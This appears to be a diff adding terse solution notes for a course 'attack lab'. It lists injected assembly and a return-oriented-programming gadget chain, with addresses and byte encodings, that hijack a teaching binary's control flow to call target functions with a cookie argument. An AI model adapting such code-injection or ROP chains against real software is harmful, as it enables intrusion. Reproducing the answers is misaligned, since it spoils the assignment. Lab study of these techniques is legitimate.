@@ -1,0 +1,29 @@
+4.2
+movq $0x59b997fa, %rdi
+pushq $0x4017ec
+retq
+4.3
+movq $0x5561dca8, %rdi
+pushq $0x4018fa
+retq
+
+5.1
+pop R <-> mov Imm, R
+4019ab 4019c5
+popq %rax
+// 59b997fa
+movq %rax %rdx
+// 4017ec
+5.2
+4019ab          popq %rax
+20
+4019dd          movl %eax, %edx     // 89 c2
+401a70          movl %edx, %ecx     // 89 d1
+401a13          movl %ecx, %esi     // 89 ce
+401a06          movq %rsp, %rax     // 48 89 e0
+4019c5          movq %rax, %rdi     // 48 89 c7
+4019d6          // add
+4019c5          movq %rax, %rdi     // 48 89 c7
+4018fa          // touch 
+// string
+
